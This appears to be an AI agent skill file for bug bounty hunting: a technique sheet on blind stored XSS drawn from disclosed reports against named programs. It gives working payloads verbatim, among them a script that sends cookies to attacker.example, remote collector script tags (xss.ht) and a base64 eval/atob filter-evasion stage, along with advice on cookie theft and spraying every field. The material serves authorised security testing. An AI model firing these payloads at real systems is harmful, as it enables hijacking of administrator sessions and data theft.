---
name: hunter-l3-blind-stored-xss
description: "Use when hunting Blind Stored XSS on a target. Loads the L3 technique sheet: Blind stored XSS is the class where you inject a payload into a form field, upload, or free-text parameter that you never see rendered yourself; the payload is stored server-side and later executes in"
domain: cybersecurity
subdomain: web
tags:
- web
- blind-stored-xss
- hunting
- l3
version: '1.0'
---

# Blind Stored XSS — Technique Sheet

## Overview

Blind stored XSS is the class where you inject a payload into a form field, upload, or free-text parameter that you never see rendered yourself; the payload is stored server-side and later executes in a privileged context — most commonly an internal admin panel, review queue, or support console — when a staff member views your submission. It pays because the injection points (contact forms, feedback widgets, "rate this review" flows, file uploads) are among the last unauthenticated, unsanitized surfaces on an otherwise locked-down app, while the execution context (admin panel) is the highest-value one. Every record in this class was a feedback/contact/submit-style endpoint except one, where the "stored" vector was a shared file rendered in a mobile WebView. Fires are typically delayed (minutes to days) and require an out-of-band callback (xss.ht, your own domain) to confirm — as seen in record 1339034 where the payload fired within 20–30 minutes of submission.

## Distinct sub-patterns

### 1. Public contact-form fields rendered in the admin panel

- **Endpoint shape:** `POST /contact` or `POST /admin` style public contact forms. Two shapes in the records:
  - `POST /contact` on www.mapbox.com — param `message`
  - `POST /admin` on partners.acronis.com — several contact-form fields at once
- **Payload that actually fired:** `<script>fetch('//attacker.example/?c='+document.cookie)</script>` (Mapbox, verbatim). Acronis: "payload injected via several contact form fields" — payload not stated verbatim.
- **Root cause:** User-supplied message content was not escaped before being sent to the middleware server and rendered; Acronis stored contact-form values and rendered them unsanitized in the admin panel.
- **Impact proven:** Mapbox: stored blind XSS on the contact page itself (program confirmed, fixed by escaping message content). Acronis: blind XSS fired in the partners.acronis.com admin panel, potential PII/sensitive-info leakage; program-confirmed, $150.
- **Exemplars:** id=158461 (Mapbox), id=1028820 (Acronis).

### 2. Feedback / widget-installation forms stored for admin review

- **Endpoint shape:** `POST` to a feedback form tied to a widget-installation flow (Judge.me). Param: `feedback`.
- **Payload that actually fired (verbatim):**
  `"><script src=https://yourxssdomain></script>`
- **Root cause:** Feedback input stored and later rendered unsanitized in the admin panel. Note the payload is a tag-breakout (`">`) followed by a script tag pulling a remote blind-XSS collector — no inline cookie exfil, everything is in the sourced script.
- **Impact proven:** Payload triggered within 20–30 minutes on https://judge.me/admin (behind HTTP Basic Auth — basic auth does NOT stop execution), giving full access to admin pages and ability to steal admin cookies.
- **Exemplar:** id=1339034 (Judge.me).

### 3. Multi-field "mouthoff"/submit.json feedback endpoints → internal admin panel

- **Endpoint shape:** `POST /mouthoff/mouthoff/submit.json` (Rockstar Games) — a JSON-accepting submission endpoint taking `name,email,age,subject,category_id,body`.
- **Payload that actually fired (verbatim):**
  `"><script src=https://abhartiya.xss.ht></script>`
- **Root cause:** The feedback form did not sanitize name/subject/body; these were later rendered unsanitized in an internal admin review panel.
- **Impact proven:** XSS executed in an internal Rockstar admin panel when an admin reviewed the comment — session-cookie theft / account takeover, plus disclosure of usernames, IPs, comments, and internal domains/paths (a rare look at internal naming from a public form).
- **Exemplar:** id=197337 (Rockstar Games).

### 4. Star-rating / review-moderation fields reflected into an admin review view

- **Endpoint shape:** `GET /reviews/ratings/{uuid}/false` — ratings submitted against a review UUID. Params: `Disliked_reviewers`, `Likeded_reviewers`, `Reasons` (verbatim field names from the record: `Disliked_reviewers,Liked_reviewers,Reasons`).
- **Payload that actually fired (verbatim):**
  `'"><img src=x id=█████ onerror=eval(atob(this.id))>`
- **Root cause:** Review rating fields are reflected without encoding into the admin review view — three separate fields (liked, disliked, reasons) each replay the attacker's input.
- **Impact proven:** Blind XSS fired in the PullRequest admin portal when an admin viewed the rating.
- **Note:** This is a notable payload variant — `id=█████` (redacted in the record) holds the base64 stage and `onerror=eval(atob(this.id))` executes it, keeping the raw payload short and attribute-safe. Useful when long inline scripts are filtered or break the markup.
- **Exemplar:** id=1558010 (HackerOne program).

### 5. Shared-file HTML rendered in a mobile WebView (client-side blind XSS)

- **Endpoint shape:** Not an HTTP form — a shared file opened in the iOS Nextcloud app (`it.twsweb.Nextcloud`), rendered in a WKWebView. No params.
- **Payload that actually fired:** "Malicious HTML payload uploaded and shared to the victim" — payload not stated verbatim; the record confirms it was an HTML file whose JavaScript executed on open.
- **Root cause:** The iOS app renders shared content in a WKWebView with JavaScript enabled and no sanitization.
- **Impact proven:** Extracted the victim's IP address, location, and OS when they opened the malicious file — no admin panel needed; the "victim view" is the mobile client itself.
- **Exemplar:** id=575562 (Nextcloud). This is the only client-side vector in the class: if a mobile app opens user-supplied files with JS enabled, treat "share with victim" as a stored-XSS delivery path.

## Bypass / chain notes

- **Tag-breakout prefix:** Both the Judge.me and Rockstar payloads begin with `">` — closing the enclosing attribute/tag of the surrounding markup before injecting the script. This is the common first move when input lands inside an HTML attribute in the admin view.
- **Remote script over inline payload:** Three of six records (`yourxssdomain`, `abhartiya.xss.ht`, and the HackerOne eval/atob stage) avoid long inline JavaScript. xss.ht-style collectors are the standard: they fingerprint the admin browser, dump DOM/cookies, and call back to you. Advantage: short payload survives field-length limits and repeated-field rendering, and you swap collector logic without resubmitting.
- **Base64-in-attribute stage (id=1558010):** `id=█████` + `onerror=eval(atob(this.id))` smuggles arbitrary JS inside a benign-looking attribute value — good against filters that scan for `script`/`eval`/long strings but not attribute content.
- **Multi-field coverage:** Acronis ("several contact form fields"), Rockstar (name/subject/body), and HackerOne (three rating fields) all fired across multiple fields. Submit the same payload in every free-text field — you don't know which one is rendered unencoded, and the record proves several often are.
- **HTTP Basic Auth is not a barrier:** The Judge.me admin panel sat behind basic auth and the payload still executed with full access to admin pages (id=1339034). Don't discount targets because "the admin panel is protected."
- **Verification chain shape (from records):** Submit payload in public form → admin opens the stored value in /admin or review view → payload executes blind in admin context → collector exfiltrates cookies/DOM (Judge.me: full admin page access; Rockstar: cookies, usernames, IPs, internal domains).

## Gotchas / what NOT to do

- **You will never see the fire.** Every report here was blind — confirmation came from a collector callback or program triage. Always point the payload at a listener you control (your domain or xss.ht); an inline `alert()` proves nothing to you.
- **Expect a delay, but don't wait days to check:** Judge.me fired in 20–30 minutes. Check your collector on a reasonable cadence, but forms on low-traffic apps may sit until an admin opens the queue.
- **Payload not stated ≠ no payload:** For Acronis (id=1028820) and Nextcloud (id=575562) the exact bytes aren't in the record — model those on the verbatim payloads above; don't invent exotic variants for them.
- **Low bounty is real:** Acronis paid $150 for a multi-field admin-panel fire — this class ranges widely. The high-value fires (Judge.me admin takeover potential, Rockstar internal disclosure) came from payloads that stole cookies/session or revealed internal infrastructure, not from a proof-of-execution popup.
- **Keep the first-stage payload minimal:** Every confirmed payload here is one tag (`script src` or `img onerror`) plus the `">` breakout. Long first stages get truncated by field limits and are harder to land inside an attribute.
- **Don't ignore mobile WebView rendering:** The Nextcloud bug had no form at all — if an app renders shared files with JS enabled, an uploaded HTML file shared to a victim is the vector, and the exfil target is the victim's environment (IP, location, OS), not an admin panel.

## Real-world impact examples

- **Admin session/cookie theft:** Judge.me (id=1339034) — payload executed behind HTTP Basic Auth on https://judge.me/admin within 20–30 minutes, giving full access to admin pages and admin-cookie theft capability. Rockstar (id=197337) — session-cookie theft and account takeover from an internal admin panel, plus leakage of usernames, IPs, and internal domains/paths to a public-form attacker.
- **Internal infrastructure disclosure:** Rockstar's internal review panel exposed internal domains and file paths via the unsanitized feedback render — a privilege/footprint reveal from an unauthenticated endpoint.
- **Admin-context blind fire, PII exposure:** Acronis (id=1028820) — blind XSS in the partners.acronis.com admin panel via contact-form fields; confirmed and paid ($150).
- **Admin portal execution via rating fields:** HackerOne program (id=1558010) — three rating fields (`Disliked_reviewers`, `Liked_reviewers`, `Reasons`) replayed the payload unencoded into the PullRequest admin view.
- **Client-side exfil:** Nextcloud iOS (id=575562) — extracted victim IP, location, and OS from a WKWebView rendering a malicious shared file.